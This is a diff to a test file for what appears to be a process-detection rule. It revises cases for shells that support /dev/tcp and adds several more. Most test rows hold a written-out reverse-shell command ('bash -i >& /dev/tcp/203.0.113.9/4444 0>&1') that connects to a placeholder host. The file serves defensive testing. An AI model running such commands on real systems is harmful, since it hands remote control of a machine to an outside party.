@@ -146,12 +146,14 @@ PROCESS_CASES = [
         {},
         False,
     ),
-    # /dev/tcp: Apple's bash lacks it; non-Apple bash and ksh have it; zsh never.
+    # /dev/tcp: bash (including Apple's /bin/bash and /bin/sh) and ksh have it; zsh never.
     (DEV_TCP, "/opt/homebrew/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
     (DEV_TCP, "/tmp/x/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
     (DEV_TCP, "/bin/ksh", "ksh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", {}, True),
-    (DEV_TCP, "/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, False),
-    (DEV_TCP, "/bin/sh", "sh -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, False),
+    (DEV_TCP, "/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
+    (DEV_TCP, "/usr/bin/bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
+    (DEV_TCP, "/bin/sh", "sh -i >& /dev/tcp/203.0.113.9/4444 0>&1", {}, True),
+    (DEV_TCP, "/bin/bash", "bash -c 'echo ping > /dev/tcp/203.0.113.9/80'", {}, False),
     (DEV_TCP, "/bin/zsh", "zsh -c 'sh -i >& /dev/tcp/203.0.113.9/4444 0>&1'", {}, False),
     (DEV_TCP, "/opt/homebrew/bin/bash", "bash -c 'echo ping > /dev/tcp/203.0.113.9/80'", {}, False),
     # Accounts: creation, admin-group membership and hiding are separate.
